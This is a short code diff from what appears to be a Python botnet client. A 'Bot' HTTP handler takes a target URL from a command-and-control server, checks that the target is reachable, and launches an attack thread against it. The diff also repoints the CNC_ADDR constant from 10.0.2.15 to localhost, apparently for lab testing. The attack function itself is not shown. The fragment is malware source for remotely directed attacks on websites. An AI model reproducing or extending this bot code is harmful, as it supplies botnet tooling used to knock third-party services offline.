@@ -62,9 +62,20 @@ class Bot(BaseHTTPRequestHandler):
         length = int(self.headers['Content-Length'])
         payload = json.loads(self.rfile.read(length).decode('utf-8'))
 
+        url = payload['url']
+
+        try:
+            res = requests.get(url)
+            if res.status_code != 200:
+                self.send_response(400)
+                return
+        except Exception:
+            self.send_response(400)
+            return
+
         self.stop.clear()
 
-        attack = threading.Thread(target=Bot.__attack, args=(self, payload['url']))
+        attack = threading.Thread(target=Bot.__attack, args=(self, url))
         attack.start()
         self.send_response(200)
 
@@ -90,7 +101,7 @@ class Bot(BaseHTTPRequestHandler):
             self.status['targets'].clear()
 
 
-CNC_ADDR = "10.0.2.15"
+CNC_ADDR = '127.0.0.1'  # "10.0.2.15"
 CNC_PORT = 60000
 
 
